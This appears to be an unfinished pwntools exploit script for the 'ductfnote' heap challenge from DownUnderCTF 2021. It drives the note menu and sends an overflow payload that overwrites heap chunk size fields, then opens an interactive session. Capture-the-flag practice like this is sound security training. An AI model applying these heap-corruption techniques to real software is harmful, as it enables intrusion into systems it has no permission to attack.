from pwn import *

DEBUG = True

if DEBUG:
    r = process("./ductfnote")
    gdb.attach(r)
else:
    r = remote("pwn-2021.duc.tf", 31917)

def create(size):
    r.sendline(b"1")
    r.recvuntil(b"Size: ")
    r.sendline(str(size))
    r.recvuntil(b">> ")

def show():
    r.sendline(b"2")
    r.recvuntil(b">> ")

def edit(payload):
    r.sendline(b"3")
    r.sendline(payload)
    r.recvuntil(b">> ")

def delete():
    r.sendline(b"4")
    r.recvuntil(b">> ")

r.recvuntil(b">> ")
create(0x7f)

payload = b"a"*0x80 + b'b'*(0x60-12 - 0x8) + p64(0) + p64(0x21) + p64(0x500)
edit(payload)

create(0x450)
delete()
r.interactive()

# print("1")
# print("127")
# print("3")
# print("a"*236+p64(0x500))
# print("4")
# print("2")

